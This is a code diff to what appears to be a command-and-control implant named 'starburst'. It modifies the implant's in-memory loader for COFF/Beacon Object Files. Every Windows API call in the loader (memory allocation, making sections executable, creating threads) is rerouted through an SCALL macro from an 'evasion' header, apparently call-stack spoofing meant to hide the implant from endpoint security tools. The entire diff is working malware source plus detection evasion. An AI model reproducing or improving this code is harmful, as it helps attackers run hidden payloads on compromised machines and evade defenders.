@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_EXECUTE_COFF
 
@@ -417,9 +418,9 @@ static auto declfn resolve_coff_symbol(
             memory::copy( func_name, const_cast<char*>(dollar + 1), func_len );
         }
 
-        auto h_mod = inst.kernel32.LoadLibraryA( mod_name );
+        auto h_mod = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, mod_name );
         if ( h_mod ) {
-            auto addr = inst.kernel32.GetProcAddress( h_mod, func_name );
+            auto addr = (FARPROC)SCALL( inst, kernel32.GetProcAddress, h_mod, func_name );
             if ( addr ) return (void*)addr;
         }
     }
@@ -500,10 +501,9 @@ auto declfn starburst::cmd_execute_coff(
     uint32_t imp_offset = ( total_alloc + 7 ) & ~7u;
     total_alloc = imp_offset + header->NumberOfSymbols * sizeof(void*);
 
-    auto coff_base = static_cast<uint8_t*>(
-        inst.kernel32.VirtualAlloc(
+    auto coff_base = (uint8_t*)(LPVOID)SCALL( inst, kernel32.VirtualAlloc,
             nullptr, total_alloc,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !coff_base ) {
         inst.heap_free( section_ptrs );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -528,7 +528,7 @@ auto declfn starburst::cmd_execute_coff(
     auto func_ptrs = static_cast<void**>(
         inst.heap_alloc( header->NumberOfSymbols * sizeof(void*) ) );
     if ( !func_ptrs ) {
-        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
+        SCALL( inst, kernel32.VirtualFree, coff_base, 0, MEM_RELEASE );
         inst.heap_free( section_ptrs );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
@@ -588,7 +588,7 @@ auto declfn starburst::cmd_execute_coff(
     }
 
     if ( !entry_ptr ) {
-        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
+        SCALL( inst, kernel32.VirtualFree, coff_base, 0, MEM_RELEASE );
         inst.heap_free( section_ptrs );
         inst.heap_free( func_ptrs );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -650,13 +650,13 @@ auto declfn starburst::cmd_execute_coff(
     for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
         if ( sections[i].Characteristics & 0x20000000 ) {
             DWORD old_protect;
-            inst.kernel32.VirtualProtect( section_ptrs[i], sec_sizes[i],
+            SCALL( inst, kernel32.VirtualProtect, section_ptrs[i], sec_sizes[i],
                 PAGE_EXECUTE_READ, &old_protect );
         }
     }
     if ( tramp_used > 0 ) {
         DWORD old_protect;
-        inst.kernel32.VirtualProtect( tramp_ptr, tramp_used * 12,
+        SCALL( inst, kernel32.VirtualProtect, tramp_ptr, tramp_used * 12,
             PAGE_EXECUTE_READ, &old_protect );
     }
 
@@ -694,18 +694,18 @@ auto declfn starburst::cmd_execute_coff(
     bof_run_ctx bctx = { entry_ptr,
         reinterpret_cast<char*>( args_data ), static_cast<int>( args_len ), &inst };
 
-    HANDLE h_bof = inst.kernel32.CreateThread(
+    HANDLE h_bof = (HANDLE)SCALL( inst, kernel32.CreateThread,
         nullptr, 0,
         reinterpret_cast<LPTHREAD_START_ROUTINE>( bof_thread_fn ),
         &bctx, 0, nullptr );
 
     if ( h_bof ) {
-        DWORD wait = inst.kernel32.WaitForSingleObject( h_bof, 60000 );
+        DWORD wait = (DWORD)SCALL( inst, kernel32.WaitForSingleObject, h_bof, 60000 );
         DWORD exit_code = 0;
-        inst.kernel32.GetExitCodeThread( h_bof, &exit_code );
+        SCALL( inst, kernel32.GetExitCodeThread, h_bof, &exit_code );
 
         if ( wait == WAIT_TIMEOUT ) {
-            inst.kernel32.TerminateThread( h_bof, 1 );
+            SCALL( inst, kernel32.TerminateThread, h_bof, 1 );
             DBG_PRINT( inst, "COFF: BOF timed out after 60s\n" );
         } else if ( exit_code == 0 ) {
             bof_ok = true;
@@ -713,7 +713,7 @@ auto declfn starburst::cmd_execute_coff(
             DBG_PRINT( inst, "COFF: BOF crashed with 0x%08X\n", exit_code );
         }
 
-        inst.kernel32.CloseHandle( h_bof );
+        SCALL( inst, kernel32.CloseHandle, h_bof );
     } else {
         instance* old_aup = coff_get_inst();
         coff_set_inst( &inst );
@@ -753,7 +753,7 @@ auto declfn starburst::cmd_execute_coff(
     if ( inst.coff.output_data ) inst.heap_free( inst.coff.output_data );
     inst.coff = {};
 
-    inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
+    SCALL( inst, kernel32.VirtualFree, coff_base, 0, MEM_RELEASE );
     inst.heap_free( section_ptrs );
     inst.heap_free( func_ptrs );
 }
